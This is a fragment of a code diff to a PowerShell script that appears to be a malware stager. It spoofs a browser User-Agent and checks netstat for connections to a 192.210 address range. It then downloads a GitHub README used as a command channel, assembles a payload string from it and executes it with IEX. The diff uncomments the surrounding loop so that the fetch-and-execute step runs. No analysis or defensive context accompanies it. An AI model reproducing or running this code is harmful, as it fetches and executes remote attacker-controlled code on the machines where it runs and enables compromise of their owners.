@@ -2,7 +2,6 @@
         $WebClientObject = New-Object Net.WebClient
         $comment = "https://raw.githubusercontent.com/raistlinm/3/master/README.md"
         $WebClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36)")
-     #   While($conn -ne 0){
             netstat -an |findstr EST |findstr 192.210
                 $conn = $LASTEXITCODE
                 $CommentResult = $WebClientObject.DownloadString($comment)
@@ -20,4 +19,3 @@
                         $full_pay = $pay+$url
                         IEX $full_pay
                 }
-#}
